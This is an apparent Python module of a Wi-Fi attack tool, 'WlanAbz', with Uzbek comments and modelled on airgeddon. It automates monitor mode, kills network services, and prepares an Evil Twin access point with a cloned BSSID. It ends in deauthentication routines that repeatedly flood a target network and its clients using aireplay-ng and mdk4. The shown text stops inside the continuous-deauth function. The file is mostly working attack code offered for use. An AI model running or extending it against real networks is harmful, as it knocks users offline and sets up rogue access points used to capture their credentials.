#!/usr/bin/env python3
"""
WlanAbz — airgeddon usuli (Ubuntu + Kali).

Asosiy oqim (airgeddon kabi):
  1) check kill  — NM/wpa va boshqalar (o'z PID o'ldirilMAYDI)
  2) airmon-ng start  — monitor interfeys
  3) airodump-ng      — skaner
  4) aireplay/mdk4/hostapd/dnsmasq
  5) airmon-ng stop + NetworkManager restart

airmon-ng check kill o'rniga xavfsiz variant: faqat nom bo'yicha
interferensiyani o'ldiradi — python jarayoni saqlanadi.
"""

from __future__ import annotations

import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
from typing import Callable, List, Optional, Tuple


# ── shell ──────────────────────────────────────────────

def run(
    cmd,
    timeout: int = 30,
    check: bool = False,
    quiet: bool = True,
) -> subprocess.CompletedProcess:
    kwargs = {
        "timeout": timeout,
        "text": True,
    }
    if quiet:
        kwargs["stdout"] = subprocess.DEVNULL
        kwargs["stderr"] = subprocess.DEVNULL
    else:
        kwargs["capture_output"] = True
    try:
        return subprocess.run(cmd, check=check, **kwargs)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, 124, "", "timeout")
    except Exception as e:
        return subprocess.CompletedProcess(cmd, 1, "", str(e))


def run_out(cmd, timeout: int = 30) -> Tuple[int, str, str]:
    try:
        p = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return p.returncode, p.stdout or "", p.stderr or ""
    except Exception as e:
        return 1, "", str(e)


# ── root / distro / deps ───────────────────────────────

def require_root() -> None:
    if os.geteuid() != 0:
        print("[-] Root (sudo) talab qilinadi.")
        print(f"    sudo {sys.executable} {' '.join(sys.argv)}")
        sys.exit(1)


def detect_distro() -> str:
    try:
        with open("/etc/os-release") as f:
            data = f.read().lower()
        if "kali" in data:
            return "kali"
        if "ubuntu" in data or "debian" in data:
            return "ubuntu"
        if "arch" in data:
            return "arch"
    except Exception:
        pass
    return "linux"


def which(name: str) -> Optional[str]:
    return shutil.which(name)


def shlex_quote(s: str) -> str:
    import shlex
    return shlex.quote(s)


def detect_terminal() -> Optional[str]:
    """airgeddon usuli: mavjud terminal emulator (xterm afzal)."""
    for name in (
        "xterm",
        "x-terminal-emulator",
        "gnome-terminal",
        "xfce4-terminal",
        "mate-terminal",
        "konsole",
        "tilix",
        "lxterminal",
        "kitty",
        "alacritty",
        "ptyxis",
        "kgx",
        "qterminal",
    ):
        p = which(name)
        if p:
            return p
    return None


def open_side_terminal(
    title: str,
    command: str,
    log=print,
    geometry: str = "100x32-20+40",
) -> Optional[subprocess.Popen]:
    """
    Kichik yon terminal oynasida buyruq (airgeddon).
    geometry: COLSxROWS-X+Y  (-20 = o'ng tomon)
    """
    term = detect_terminal()
    if not term:
        log("[!] Terminal topilmadi — o'rnating: sudo apt install -y xterm")
        return None

    display = os.environ.get("DISPLAY") or ":0"
    env = os.environ.copy()
    env["DISPLAY"] = display
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        xauth = f"/home/{sudo_user}/.Xauthority"
        if os.path.isfile(xauth):
            env["XAUTHORITY"] = xauth

    base = os.path.basename(term)
    # bash -lc ichida ishlatiladigan to'liq buyruq
    inner = command

    if base == "xterm":
        cmd = [
            term,
            "-geometry", geometry,
            "-T", title,
            "-bg", "black",
            "-fg", "green",
            "-fa", "Monospace",
            "-fs", "10",
            "-e", "bash", "-lc", inner,
        ]
    elif base in ("gnome-terminal", "kgx"):
        g = geometry.split("-")[0].split("+")[0]
        cmd = [
            term, f"--geometry={g}", f"--title={title}",
            "--", "bash", "-lc", inner,
        ]
    elif base == "xfce4-terminal":
        cmd = [
            term, f"--geometry={geometry}", f"--title={title}",
            "-e", f"bash -lc {shlex_quote(inner)}",
        ]
    elif base == "mate-terminal":
        g = geometry.split("-")[0].split("+")[0]
        cmd = [
            term, f"--geometry={g}", f"--title={title}",
            "-e", f"bash -lc {shlex_quote(inner)}",
        ]
    elif base == "konsole":
        cmd = [term, "-e", "bash", "-lc", inner]
    elif base == "tilix":
        cmd = [term, "-a", "app-new-window", "-e", f"bash -lc {shlex_quote(inner)}"]
    elif base == "lxterminal":
        g = geometry.split("-")[0].split("+")[0]
        cmd = [
            term, f"--geometry={g}", f"--title={title}",
            "-e", f"bash -lc {shlex_quote(inner)}",
        ]
    elif base in ("kitty", "alacritty"):
        cmd = [term, "-e", "bash", "-lc", inner]
    elif base == "ptyxis":
        cmd = [term, "--new-window", "-x", "bash", "-lc", inner]
    elif base == "x-terminal-emulator":
        # ba'zilar xterm sintaksisini tushunadi
        cmd = [term, "-geometry", geometry, "-T", title, "-e", "bash", "-lc", inner]
    else:
        cmd = [term, "-e", "bash", "-lc", inner]

    try:
        proc = subprocess.Popen(
            cmd,
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        time.sleep(0.4)
        if proc.poll() is not None:
            # x-terminal-emulator ba'zan -geometry ni rad etadi
            if base == "x-terminal-emulator":
                proc = subprocess.Popen(
                    [term, "-e", "bash", "-lc", inner],
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True,
                )
                time.sleep(0.3)
            if proc.poll() is not None:
                log(f"[!] Yon oyna darhol yopildi ({base})")
                return None
        log(f"[+] Yon oyna ochildi: {base} — «{title}»")
        return proc
    except Exception as e:
        log(f"[!] Yon oyna ochilmadi ({base}): {e}")
        return None


def ensure_dependencies(log=print) -> bool:
    """
    airgeddon paketlar: aircrack-ng, hostapd, dnsmasq, iw, iptables, mdk4, scapy, rich, xterm
    """
    apt_pkgs = []
    tools = {
        "airmon-ng": "aircrack-ng",
        "aireplay-ng": "aircrack-ng",
        "airodump-ng": "aircrack-ng",
        "airbase-ng": "aircrack-ng",
        "hostapd": "hostapd",
        "dnsmasq": "dnsmasq",
        "iw": "iw",
        "iptables": "iptables",
        "mdk4": "mdk4",
    }
    for tool, pkg in tools.items():
        if which(tool) is None and pkg not in apt_pkgs:
            apt_pkgs.append(pkg)

    # airgeddon yon oyna — xterm eng ishonchli (geometry)
    if which("xterm") is None:
        apt_pkgs.append("xterm")

    try:
        import scapy  # noqa: F401
    except ImportError:
        apt_pkgs.append("python3-scapy")

    try:
        import rich  # noqa: F401
    except ImportError:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "-q", "rich"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=120,
            )
        except Exception:
            apt_pkgs.append("python3-rich")

    if not apt_pkgs:
        log("[+] Paketlar tayyor (aircrack-ng, hostapd, dnsmasq, mdk4, ...)")
        return True

    log(f"[*] O'rnatilmoqda: {', '.join(apt_pkgs)}")
    try:
        if detect_distro() in ("ubuntu", "linux"):
            run(["add-apt-repository", "-y", "universe"], timeout=60)
        run(["apt-get", "update", "-y"], timeout=180)
        r = run(
            ["apt-get", "install", "-y"] + apt_pkgs,
            timeout=600,
            quiet=False,
        )
        if r.returncode != 0:
            log(f"[!] apt qisman xato (code={r.returncode})")
            if "mdk4" in apt_pkgs and which("mdk4") is None:
                run(["apt-get", "install", "-y", "mdk4"], timeout=180)
    except Exception as e:
        log(f"[!] apt xato: {e}")
        return False

    status = []
    for tool in ("airmon-ng", "airodump-ng", "aireplay-ng", "hostapd", "dnsmasq", "mdk4"):
        status.append(f"{tool}={'bor' if which(tool) else 'yoq'}")
    log("[+] Paketlar: " + ", ".join(status))
    if which("mdk4") is None:
        log("[!] mdk4 yo'q — uzish faqat aireplay bilan ishlaydi")
        log("    O'rnatish: sudo apt install -y mdk4")
    return True


# ── interfeys ──────────────────────────────────────────

def list_net_ifaces() -> List[str]:
    try:
        return sorted(os.listdir("/sys/class/net"))
    except Exception:
        return []


def list_wifi_ifaces(include_mon: bool = True) -> List[str]:
    found = []
    code, out, _ = run_out(["iw", "dev"])
    if code == 0 and out:
        for m in re.finditer(r"Interface\s+(\S+)", out):
            n = m.group(1)
            if "p2p" in n.lower():
                continue
            if n not in found:
                found.append(n)
    for n in list_net_ifaces():
        if n in found:
            continue
        if "p2p" in n.lower() or n in ("lo", "at0"):
            continue
        if re.match(r"^(wl|wlan|wlp)", n) or n.endswith("mon") or n.startswith("mon"):
            if os.path.exists(f"/sys/class/net/{n}/wireless") or os.path.exists(
                f"/sys/class/net/{n}/phy80211"
            ):
                found.append(n)
            elif re.match(r"^(wl|wlan)", n) or n.endswith("mon"):
                found.append(n)
    if not include_mon:
        found = [
            x
            for x in found
            if not x.endswith("mon")
            and not (x.startswith("mon") and x[3:].isdigit())
            and iface_type(x) != "monitor"
        ]
    return found


def iface_exists(name: Optional[str]) -> bool:
    return bool(name) and os.path.exists(f"/sys/class/net/{name}")


def iface_type(iface: str) -> str:
    code, out, _ = run_out(["iw", "dev", iface, "info"])
    if code == 0:
        m = re.search(r"type\s+(\S+)", out)
        if m:
            return m.group(1)
    return "?"


def find_phy(iface: Optional[str] = None) -> str:
    if iface and iface_exists(iface):
        path = f"/sys/class/net/{iface}/phy80211"
        try:
            return os.path.basename(os.path.realpath(path))
        except Exception:
            pass
        code, out, _ = run_out(["iw", "dev", iface, "info"])
        m = re.search(r"wiphy\s+(\d+)", out)
        if m:
            return f"phy{m.group(1)}"
    if os.path.isdir("/sys/class/ieee80211"):
        phys = sorted(os.listdir("/sys/class/ieee80211"))
        if phys:
            return phys[0]
    return "phy0"


def base_name(iface: str) -> str:
    if iface.endswith("mon") and len(iface) > 3:
        return iface[:-3]
    if iface.startswith("mon") and len(iface) > 3 and iface[3:].isdigit():
        return "wlan0"
    return iface


def normalize_channel(ch) -> int:
    """Twin AP uchun 2.4 GHz (1/6/11) — Intel hostapd barqarorroq."""
    try:
        c = int(ch)
    except (TypeError, ValueError):
        return 6
    if c > 14:
        return 6
    if c in (1, 6, 11):
        return c
    if 1 <= c <= 14:
        return min((1, 6, 11), key=lambda x: abs(x - c))
    return 6


def set_channel(iface: str, channel: int, force_raw: bool = False) -> bool:
    """
    force_raw=True: 5 GHz kanallarni ham o'rnatish (skaner/deauth).
    force_raw=False: twin uchun 2.4 ga normalizatsiya.
    """
    try:
        ch = int(channel)
    except (TypeError, ValueError):
        ch = 6
    if not force_raw:
        ch = normalize_channel(ch)
    r = run(["iw", "dev", iface, "set", "channel", str(ch)])
    if r.returncode != 0 and ch <= 14:
        freq = 2407 + ch * 5
        r = run(["iw", "dev", iface, "set", "freq", str(freq)])
    return r.returncode == 0


# ── airgeddon: check kill + airmon ─────────────────────

_INTERFERERS = (
    "NetworkManager",
    "wpa_supplicant",
    "wpa_cli",
    "dhclient",
    "dhcpcd",
    "avahi-daemon",
    "iwd",
    "hostapd",
    "dnsmasq",
    "dhcpd",
    "airbase-ng",
    "aireplay-ng",
    "airodump-ng",
    "mdk4",
    "wpa_action",
    "ifplugd",
)


def airgeddon_check_kill(log: Callable = print, iface: Optional[str] = None) -> None:
    """
    airgeddon / airmon-ng check kill ekvivalenti.
    FARQ: o'z PID va parent o'ldirilMAYDI (python saqlanadi).
    """
    me = os.getpid()
    parent = os.getppid()
    log("[*] Interferensiyani to'xtatish (xavfsiz)...")

    targets = [iface] if iface else list_wifi_ifaces(include_mon=True)
    for n in targets:
        if not n:
            continue
        run(["nmcli", "device", "set", n, "managed", "no"])
        run(["nmcli", "device", "disconnect", n])

    for svc in (
        "NetworkManager",
        "NetworkManager-wait-online",
        "wpa_supplicant",
        "iwd",
    ):
        run(["systemctl", "stop", svc])
    run(["service", "NetworkManager", "stop"])

    for p in _INTERFERERS:
        run(["pkill", "-x", p])

    if which("airmon-ng"):
        code, out, err = run_out(["airmon-ng", "check"], timeout=15)
        text = (out or "") + "\n" + (err or "")
        for m in re.finditer(r"\b(\d{2,7})\b", text):
            try:
                pid = int(m.group(1))
            except ValueError:
                continue
            if pid in (me, parent, 0, 1):
                continue
            try:
                with open(f"/proc/{pid}/comm") as f:
                    comm = f.read().strip()
            except Exception:
                continue
            low = comm.lower()
            if any(
                x in low
                for x in (
                    "network",
                    "wpa",
                    "dhcp",
                    "avahi",
                    "iwd",
                    "hostapd",
                    "dnsmasq",
                    "airodump",
                    "aireplay",
                    "airbase",
                    "mdk4",
                    "wifi",
                )
            ):
                try:
                    os.kill(pid, signal.SIGTERM)
                except Exception:
                    pass

    run(["rfkill", "unblock", "all"])
    run(["iw", "reg", "set", "US"])
    time.sleep(0.6)
    log("[+] Interferensiya to'xtatildi (tarmoq boshqaruvchisi)")


def kill_interfering(kill_nm: bool = True, iface: Optional[str] = None) -> None:
    if kill_nm:
        airgeddon_check_kill(log=lambda *_: None, iface=iface)
    else:
        for p in ("hostapd", "dnsmasq", "airbase-ng", "aireplay-ng", "airodump-ng", "mdk4"):
            run(["pkill", "-x", p])
        run(["rfkill", "unblock", "all"])


def _find_monitor_iface(preferred_base: Optional[str] = None) -> Optional[str]:
    cands = []
    for n in list_wifi_ifaces(include_mon=True):
        typ = iface_type(n)
        if typ == "monitor" or n.endswith("mon") or (
            n.startswith("mon") and n[3:].isdigit()
        ):
            cands.append(n)
    if preferred_base:
        prefer = [
            preferred_base + "mon",
            preferred_base,
            "wlan0mon",
            "mon0",
        ]
        for p in prefer:
            if p in cands:
                return p
            if iface_exists(p) and iface_type(p) == "monitor":
                return p
    for n in cands:
        if iface_type(n) == "monitor":
            return n
    return cands[0] if cands else None


def airmon_start(iface: str, log: Callable = print) -> Optional[str]:
    """
    airgeddon: airmon-ng start <iface>
    Muvaffaqiyatsiz bo'lsa: iw set type monitor.
    """
    if not iface_exists(iface):
        mon = _find_monitor_iface(iface)
        if mon:
            run(["ip", "link", "set", mon, "up"])
            return mon
        log(f"[-] Interfeys yo'q: {iface}")
        return None

    if iface_type(iface) == "monitor":
        run(["ip", "link", "set", iface, "up"])
        log(f"[+] Allaqachon kuzatuv (monitor) rejimida: {iface}")
        return iface

    airgeddon_check_kill(log=log, iface=iface)
    cleanup_p2p_at0(log=log)

    mon = None
    if which("airmon-ng"):
        log(f"[*] Monitor yoqilmoqda (airmon-ng): {iface} ...")
        code, out, err = run_out(["airmon-ng", "start", iface], timeout=45)
        text = (out or "") + "\n" + (err or "")
        m = re.search(
            r"(?:monitor mode (?:vif )?enabled on\s+(\S+)|"
            r"\(monitor mode enabled\)\s*on\s+(\S+)|"
            r"mac80211 monitor mode vif enabled[^\n]*on\s+\[?(\S+)\]?)",
            text,
            re.I,
        )
        if m:
            mon = next(g for g in m.groups() if g)
            mon = mon.strip("[]()")
        if not mon or not iface_exists(mon):
            mon = _find_monitor_iface(iface)
        if mon and iface_exists(mon):
            run(["ip", "link", "set", mon, "up"])
            if iface_type(mon) == "monitor":
                set_channel(mon, 6, force_raw=True)
                log(f"[+] Monitor tayyor: {mon}")
                return mon
            log(f"[!] Interfeys topildi, lekin rejim noto'g'ri: {mon} ({iface_type(mon)})")

    log(f"[*] Zaxira usul: iw orqali monitor ({iface})")
    run(["nmcli", "device", "set", iface, "managed", "no"])
    run(["ip", "link", "set", iface, "down"])
    run(["ip", "addr", "flush", "dev", iface])
    time.sleep(0.3)
    r = run(["iw", "dev", iface, "set", "type", "monitor"], quiet=False)
    if r.returncode == 0:
        run(["ip", "link", "set", iface, "up"])
        time.sleep(0.3)
        if iface_type(iface) == "monitor":
            set_channel(iface, 6, force_raw=True)
            log(f"[+] Monitor tayyor (iw): {iface}")
            return iface

    phy = find_phy(iface)
    mon_name = f"{base_name(iface)}mon"
    if iface_exists(mon_name):
        run(["ip", "link", "set", mon_name, "down"])
        run(["iw", "dev", mon_name, "del"])
    run(["ip", "link", "set", iface, "down"])
    run(["iw", "phy", phy, "interface", "add", mon_name, "type", "monitor"])
    if iface_exists(mon_name):
        run(["ip", "link", "set", mon_name, "up"])
        if iface_type(mon_name) == "monitor":
            log(f"[+] Qo'shimcha monitor interfeys: {mon_name}")
            return mon_name

    log("[-] Monitor rejimini yoqib bo'lmadi")
    return None


def airmon_stop(mon_iface: Optional[str] = None, log: Callable = print) -> None:
    """airmon-ng stop + tarmoqni tiklash."""
    log("[*] Monitor to'xtatilmoqda, tarmoq tiklanmoqda...")
    if mon_iface and iface_exists(mon_iface) and which("airmon-ng"):
        run(["airmon-ng", "stop", mon_iface], timeout=30)
    for n in list(list_wifi_ifaces(include_mon=True)):
        if n.endswith("mon") or n.startswith("mon") or iface_type(n) == "monitor":
            if which("airmon-ng"):
                run(["airmon-ng", "stop", n], timeout=20)
            run(["ip", "link", "set", n, "down"])
            if iface_type(n) == "monitor":
                run(["iw", "dev", n, "set", "type", "managed"])
            if n.endswith("mon") or n.startswith("mon"):
                run(["iw", "dev", n, "del"])
        elif iface_type(n) == "AP":
            run(["ip", "link", "set", n, "down"])
            run(["iw", "dev", n, "set", "type", "managed"])
            run(["ip", "link", "set", n, "up"])

    for n in list_wifi_ifaces(include_mon=True):
        if iface_exists(n) and iface_type(n) not in ("managed", "?"):
            run(["ip", "link", "set", n, "down"])
            run(["iw", "dev", n, "set", "type", "managed"])
            run(["ip", "link", "set", n, "up"])

    cleanup_p2p_at0(log=log)
    for p in ("hostapd", "dnsmasq", "airbase-ng", "aireplay-ng", "airodump-ng", "mdk4"):
        run(["pkill", "-x", p])
    run(["iptables", "-t", "nat", "-F"])
    run(["iptables", "-t", "mangle", "-F"])
    run(["iptables", "-F"])
    run(["iptables", "-P", "FORWARD", "ACCEPT"])

    for n in list_wifi_ifaces(include_mon=False):
        run(["nmcli", "device", "set", n, "managed", "yes"])
        if mon_iface:
            b = base_name(mon_iface)
            run(["nmcli", "device", "set", b, "managed", "yes"])

    run(["systemctl", "start", "NetworkManager"])
    run(["systemctl", "start", "wpa_supplicant"])
    run(["service", "NetworkManager", "restart"])
    time.sleep(1.2)
    log("[+] Tarmoq boshqaruvchisi tiklandi")


def to_monitor(iface: str, log=print) -> Optional[str]:
    return airmon_start(iface, log=log)


def mon_to_managed(mon_name: str, log=print) -> Optional[str]:
    """
    Monitor → managed station.
    airmon stop ba'zan iface ni yo'qotadi — phy dan qayta yaratamiz.
    """
    if not iface_exists(mon_name):
        # mon yo'q — base bormi?
        b = base_name(mon_name) if mon_name else None
        if b and iface_exists(b):
            return to_managed(b) or b
        return None

    phy = find_phy(mon_name)
    base = base_name(mon_name)
    # mon0 / monet0 kabi nomlardan asl stationni topish
    if base in ("wlan0", mon_name) and mon_name.startswith("mon"):
        for n in list_wifi_ifaces(include_mon=False):
            base = n
            break
        else:
            # phy dagi barcha nomlar
            for cand in ("wlp1s0", "wlp0s20f3", "wlan0", "wlp2s0"):
                base = cand
                break

    log(f"[*] Monitor → oddiy rejim: {mon_name} → {base}")

    # 1) airmon-ng stop
    if which("airmon-ng"):
        run(["airmon-ng", "stop", mon_name], timeout=25)
        time.sleep(0.4)
        if iface_exists(base):
            run(["nmcli", "device", "set", base, "managed", "no"])
            run(["ip", "link", "set", base, "down"])
            run(["iw", "dev", base, "set", "type", "managed"])
            run(["ip", "addr", "flush", "dev", base])
            run(["ip", "link", "set", base, "up"])
            return base
        if iface_exists(mon_name):
            if iface_type(mon_name) != "monitor":
                return mon_name

    # 2) iw: type managed / rename
    if iface_exists(mon_name):
        run(["ip", "link", "set", mon_name, "down"])
        run(["iw", "dev", mon_name, "set", "type", "managed"])
        if mon_name != base:
            run(["ip", "link", "set", mon_name, "name", base])
            time.sleep(0.2)
        if not iface_exists(base) and iface_exists(mon_name):
            # rename fail — mon nomini ishlatamiz
            base = mon_name
        if iface_exists(base):
            run(["nmcli", "device", "set", base, "managed", "no"])
            run(["ip", "addr", "flush", "dev", base])
            run(["ip", "link", "set", base, "up"])
            return base
        # mon hali bor — o'chiramiz
        run(["iw", "dev", mon_name, "del"])
        time.sleep(0.2)

    # 3) phy dan yangi managed
    return recreate_station(base, phy=phy, log=log)


def recreate_station(
    name: Optional[str] = None,
    phy: Optional[str] = None,
    log=print,
) -> Optional[str]:
    """Yo'qolgan station iface ni phy dan qayta yaratish (rekursiyasiz)."""
    phy = phy or find_phy(None)
    candidates = []
    if name:
        candidates.append(base_name(name) if str(name).endswith("mon") else name)
    for n in list_wifi_ifaces(include_mon=True):
        if n.endswith("mon"):
            candidates.insert(0, base_name(n))
        elif not n.startswith("mon"):
            candidates.append(n)
    candidates.extend(["wlp1s0", "wlp0s20f3", "wlan0", "wlp2s0", "wlp3s0"])

    # avval mon VIF larni olib tashlash (joy ochish)
    for n in list(list_wifi_ifaces(include_mon=True)):
        if n.endswith("mon") or (n.startswith("mon") and n[3:].isdigit()):
            run(["ip", "link", "set", n, "down"])
            run(["iw", "dev", n, "del"])
            time.sleep(0.15)

    seen = set()
    for cand in candidates:
        if not cand or cand in seen or "p2p" in cand.lower():
            continue
        seen.add(cand)
        if iface_exists(cand):
            typ = iface_type(cand)
            if typ == "monitor":
                run(["ip", "link", "set", cand, "down"])
                run(["iw", "dev", cand, "set", "type", "managed"])
            run(["nmcli", "device", "set", cand, "managed", "no"])
            run(["ip", "addr", "flush", "dev", cand])
            run(["ip", "link", "set", cand, "up"])
            log(f"[+] Stansiya interfeysi tayyor: {cand}")
            return cand
        log(f"[*] Interfeys yaratilmoqda: {cand} @ {phy}")
        r = run(
            ["iw", "phy", phy, "interface", "add", cand, "type", "managed"],
            quiet=False,
        )
        time.sleep(0.3)
        if iface_exists(cand):
            run(["nmcli", "device", "set", cand, "managed", "no"])
            run(["ip", "link", "set", cand, "up"])
            log(f"[+] Stansiya yaratildi: {cand}")
            return cand
        if r.returncode != 0:
            log(f"[!] {cand} yaratib bo'lmadi")
    return None


def ensure_ap_iface(
    preferred: Optional[str] = None,
    mon: Optional[str] = None,
    log=print,
) -> Optional[str]:
    """
    Evil Twin uchun managed AP iface kafolati.
    Pre-deauth / airmon dan keyin yo'qolgan iface ni tiklaydi.
    """
    # 1) preferred
    names = []
    if preferred:
        names.append(preferred)
        names.append(base_name(preferred))
    if mon:
        names.append(base_name(mon))
        names.append(mon)

    for n in names:
        if not n or not iface_exists(n):
            continue
        if iface_type(n) == "monitor" or n.endswith("mon") or n.startswith("mon"):
            r = mon_to_managed(n, log=log)
            if r and iface_exists(r):
                run(["nmcli", "device", "set", r, "managed", "no"])
                return r
        else:
            run(["nmcli", "device", "set", n, "managed", "no"])
            run(["ip", "link", "set", n, "down"])
            run(["iw", "dev", n, "set", "type", "managed"])
            run(["ip", "addr", "flush", "dev", n])
            run(["ip", "link", "set", n, "up"])
            return n

    # 2) mon → managed
    if mon and iface_exists(mon):
        r = mon_to_managed(mon, log=log)
        if r and iface_exists(r):
            run(["nmcli", "device", "set", r, "managed", "no"])
            return r

    # 3) har qanday wifi
    for n in list_wifi_ifaces(include_mon=True):
        if "p2p" in n.lower():
            continue
        if iface_type(n) == "monitor" or n.endswith("mon"):
            r = mon_to_managed(n, log=log)
            if r:
                run(["nmcli", "device", "set", r, "managed", "no"])
                return r
        else:
            run(["nmcli", "device", "set", n, "managed", "no"])
            return n

    # 4) phy recreate
    log("[!] Stansiya yo'q — qayta yaratilmoqda...")
    return recreate_station(preferred or (base_name(mon) if mon else None), log=log)


def to_managed(iface: str) -> Optional[str]:
    if not iface_exists(iface):
        return None
    if (
        iface.endswith("mon")
        or iface.startswith("mon")
        or iface_type(iface) == "monitor"
    ):
        return mon_to_managed(iface)
    run(["ip", "link", "set", iface, "down"])
    run(["iw", "dev", iface, "set", "type", "managed"])
    run(["ip", "addr", "flush", "dev", iface])
    run(["ip", "link", "set", iface, "up"])
    return iface


def resolve_station(preferred: Optional[str] = None, log=print) -> Optional[str]:
    cands = []
    if preferred:
        cands.append(preferred)
        cands.append(base_name(preferred))
        if not preferred.endswith("mon"):
            cands.append(preferred + "mon")
    cands.extend(list_wifi_ifaces(include_mon=True))

    seen = set()
    for n in cands:
        if not n or n in seen:
            continue
        seen.add(n)
        if not iface_exists(n) or "p2p" in n.lower():
            continue
        typ = iface_type(n)
        if typ == "monitor" or n.endswith("mon") or n.startswith("mon"):
            r = mon_to_managed(n, log=log)
            if r:
                return r
        else:
            return to_managed(n) or n

    phy = find_phy(None)
    for name in ("wlan0", "wlp1s0"):
        if iface_exists(name):
            return to_managed(name) or name
        run(["iw", "phy", phy, "interface", "add", name, "type", "managed"])
        if iface_exists(name):
            run(["ip", "link", "set", name, "up"])
            return name
    return None


def restore_network(iface: Optional[str] = None, log=print) -> None:
    airmon_stop(iface, log=log)


def add_monitor_vif(phy: str, channel: int = 6, log=print) -> Optional[str]:
    """airgeddon dual: phy dan monX (hostapd AP bilan parallel deauth)."""
    mon = f"mon{phy.replace('phy', '')}" if phy.startswith("phy") else "mon0"
    if iface_exists(mon):
        run(["ip", "link", "set", mon, "down"])
        run(["iw", "dev", mon, "del"])
    r = run(
        ["iw", "phy", phy, "interface", "add", mon, "type", "monitor"],
        quiet=False,
    )
    if r.returncode != 0:
        mon = "monet0"
        if iface_exists(mon):
            run(["iw", "dev", mon, "del"])
        r = run(
            ["iw", "phy", phy, "interface", "add", mon, "type", "monitor"],
            quiet=False,
        )
        if r.returncode != 0:
            log("[!] Qo'shimcha monitor yaratilmadi")
            return None
    run(["ip", "link", "set", mon, "up"])
    set_channel(mon, channel, force_raw=True)
    log(f"[+] Uzish uchun monitor: {mon}")
    return mon


def del_iface(name: str) -> None:
    if iface_exists(name):
        run(["ip", "link", "set", name, "down"])
        run(["iw", "dev", name, "del"])


def cleanup_p2p_at0(log=print) -> None:
    for n in list_net_ifaces():
        if "p2p" in n.lower():
            log(f"[*] P2P o'chirish: {n}")
            del_iface(n)
        if n == "at0":
            run(["ip", "link", "set", "at0", "down"])
            run(["ip", "addr", "flush", "dev", "at0"])


# ── kanallar / AP ──────────────────────────────────────

CHANNELS_2_4 = list(range(1, 14))
CHANNELS_5 = [
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165,
]
ALL_CHANNELS = CHANNELS_2_4 + CHANNELS_5


def fake_bssid(bssid: str) -> Optional[str]:
    try:
        p = bssid.strip().lower().split(":")
        if len(p) != 6:
            return None
        last = (int(p[-1], 16) + 1) % 256
        p[-1] = f"{last:02x}"
        return ":".join(p)
    except Exception:
        return None


def supports_ap(iface: str) -> bool:
    phy = find_phy(iface)
    code, out, _ = run_out(["iw", "phy", phy, "info"])
    if code != 0:
        return True
    if re.search(r"Supported interface modes:[\s\S]*?\*\s*AP\b", out):
        return True
    return "* AP" in out or "AP/VLAN" in out


def supports_monitor(iface: str) -> bool:
    phy = find_phy(iface)
    code, out, _ = run_out(["iw", "phy", phy, "info"])
    if code != 0:
        return True
    return bool(re.search(r"\*\s*monitor\b", out, re.I))


def set_txpower_max(iface: str, log=print) -> None:
    if not iface_exists(iface):
        return
    for dbm in (30, 27, 25, 22, 20):
        r = run(
            ["iw", "dev", iface, "set", "txpower", "fixed", str(dbm * 100)],
            quiet=False,
        )
        if r.returncode == 0:
            log(f"[+] Uzatish quvvati: {dbm} dBm @ {iface}")
            return
    run(["iw", "dev", iface, "set", "txpower", "auto"])
    log(f"[*] Uzatish quvvati: avto @ {iface}")


def split_ap_deauth_ifaces(
    preferred: Optional[str] = None,
) -> Tuple[Optional[str], Optional[str]]:
    stations = []
    for n in list_wifi_ifaces(include_mon=True):
        if "p2p" in n.lower():
            continue
        s = n
        if n.endswith("mon") or iface_type(n) == "monitor":
            s = mon_to_managed(n) or n
        if s and iface_exists(s) and s not in stations:
            stations.append(s)

    if preferred:
        pref = base_name(preferred)
        if pref in stations:
            stations.remove(pref)
            stations.insert(0, pref)

    if not stations:
        return None, None
    if len(stations) == 1:
        return stations[0], None

    ap = None
    deauth = None
    for s in stations:
        if supports_ap(s) and ap is None:
            ap = s
        elif supports_monitor(s) and deauth is None and s != ap:
            deauth = s
    if ap is None:
        ap = stations[0]
    if deauth is None:
        for s in stations:
            if s != ap:
                deauth = s
                break
    return ap, deauth


def aggressive_deauth_burst(
    mon: str,
    bssid: str,
    seconds: int = 15,
    client_macs: Optional[List[str]] = None,
    log=print,
) -> None:
    if not mon or not bssid or not iface_exists(mon):
        return
    log(f"[*] Kuchli uzish {seconds}s → {bssid} @ {mon}")
    end = time.time() + seconds
    use_mdk4 = which("mdk4") is not None
    clients = client_macs or []
    while time.time() < end:
        run(
            [
                "aireplay-ng", "-0", "15", "-a", bssid,
                "--ignore-negative-one", mon,
            ],
            timeout=20,
        )
        for mac in clients[:8]:
            run(
                [
                    "aireplay-ng", "-0", "8", "-a", bssid, "-c", mac,
                    "--ignore-negative-one", mon,
                ],
                timeout=15,
            )
        if use_mdk4:
            try:
                subprocess.run(
                    ["mdk4", mon, "d", "-B", bssid],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=4,
                )
            except Exception:
                pass
        time.sleep(0.5)


def start_continuous_deauth(
    mon: str,
    bssid: str,
    stop_event: threading.Event,
    client_macs_fn=None,
    log=print,
) -> threading.Thread:
    use_mdk4 = which("mdk4") is not None

    def loop():
        log(f"[+] Davomiy uzish boshlandi @ {mon}")
        while not stop_event.is_set():
            run(
                [
                    "aireplay-ng", "-0", "12", "-a", bssid,
                    "--ignore-negative-one", mon,
                ],
                timeout=18,
            )
            clients = []
            if callable(client_macs_fn):
                try:
                    clients = client_macs_fn() or []
                except Exception:
                    clients = []
            for mac in clients[:6]:
                if stop_event.is_set():
                    break
                run(
                    [
                        "aireplay-ng", "-0", "6", "-a", bssid, "-c", mac,
                        "--ignore-negative-one", mon,
                    ],
                    timeout=12,
                )
            if use_mdk4 and not stop_event.is_set():
                try:
                    subprocess.run(
                        ["mdk4", mon, "d", "-B", bssid],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=3,
                    )
                except Exception:
                    pass
            stop_event.wait(1.2)
        log("[*] Davomiy uzish to'xtatildi")

